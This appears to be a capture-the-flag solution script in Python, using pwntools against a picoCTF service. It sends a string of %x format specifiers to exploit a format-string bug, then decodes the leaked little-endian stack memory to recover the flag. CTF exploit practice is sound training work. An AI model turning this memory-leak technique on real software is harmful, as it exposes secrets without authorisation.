import pwn
import binascii

# p = pwn.process('./a.out', level='error')
p = pwn.remote("mercury.picoctf.net", 6989)

p.readuntil("2) View my portfolio")

p.sendline(b"1")
p.readuntil("What is your API token?")
p.sendline(f"%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x".encode())

# The first 2 lines are not part of the memory dump.
for _ in range(3):
    output = p.readline()

# Receive the memory dump as a little-endian hex string.
le_string = binascii.unhexlify(output.strip())
# Decode as much as possible.
le_string = le_string.decode('unicode_escape').strip()
# The flag should have this format: picoCTF{hash.....bla bla bla}
# After converting to little-endian, it should start with "ocip......"
be = ""
for j in range(len(le_string)):
    # Find the first letter in the string as LE
    if le_string[j] == 'o':
        break
# Convert to big-endian.
for i in range(j , len(le_string) - 3, 4):
    be += le_string[i+3] + le_string[i+2] + le_string[i+1] + le_string[i+0]

# Print the answer.
print(be)
p.close()
